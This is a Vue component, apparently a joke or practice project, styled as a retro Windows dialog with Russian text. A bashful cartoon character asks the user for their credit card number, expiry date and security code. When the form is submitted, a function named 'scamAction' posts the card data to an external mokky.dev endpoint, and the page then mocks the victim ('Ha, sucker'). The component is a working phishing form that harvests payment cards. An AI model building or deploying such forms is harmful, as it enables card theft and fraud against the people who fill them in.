<template>
  <div class="window active" style="width: 520px">
    <div class="title-bar">
      <div class="title-bar-text">A window with contents</div>
      <div class="title-bar-controls">
        <button aria-label="Minimize"></button>
        <button aria-label="Maximize"></button>
        <button aria-label="Close"></button>
      </div>
    </div>
    <div class="window-body has-space flex">
      <div class="img">
        <img src="./assets/LcraCIp.gif" alt="стесняеца" />
      </div>
      <div class="flex-column">
        <p>П-привет...</p>
        <p>Можешь, п-пожалуйста, сообщить данные своей к-кредитной карточки?</p>
        <form class="justifying">
          <div class="flex space-between">
            <label for="nums">номер карты:</label>
            <input
              v-model="items.nums"
              type="password"
              pattern="\d{16,16}"
              required
              id="nums"
            />
          </div>
          <div class="flex space-between">
            <label for="date">срок годности:</label>
            <input
              v-model="items.date"
              type="password"
              pattern="\d{4,4}"
              required
              id="date"
            />
          </div>
          <div class="flex space-between">
            <label for="code">код безопасности:</label>
            <input
              v-model="items.code"
              type="password"
              pattern="\d{3,3}"
              required
              id="code"
            />
          </div>
        </form>
        <button @click="submitForm()">с-спасибо...</button>
      </div>
    </div>
  </div>
</template>

<style>
p {
  font-size: 14px;
}
.window-active {
  max-width: 1000px;
}
.flex {
  display: flex;
}
.space-between {
  justify-content: space-between;
}
.justifying {
  padding: 20px 0;
}
.justifying div {
  padding: 5px 0;
}
.flex-column {
  display: flex;
  flex-direction: column;
}
.flex-column p {
  font-weight: 700;
  padding-top: 5px;
  margin: 0 auto;
  text-align: center;
}
input {
  width: 120px;
}
input:invalid {
  background-color: #fff;
}
input:valid {
  background-color: palegreen;
}
.flex-column button {
  width: 100px;
  margin: 0 auto;
}
</style>
<script setup>
import { reactive } from "vue";
import axios from "axios";

const items = reactive({
  nums: null,
  date: null,
  code: null,
});

function submitForm() {
  const formIsValid =
    document.getElementById("nums").validity.valid &&
    document.getElementById("date").validity.valid &&
    document.getElementById("code").validity.valid;

  if (formIsValid) {
    const scamAction = async () => {
      const { data } = await axios.post(
        "https://a4b05dee6315b48c.mokky.dev/items",
        items
      );
    };
    scamAction();
    alert("Ха, лошара");
  } else {
    alert("....попробуй еще раз.");
  }
}
</script>
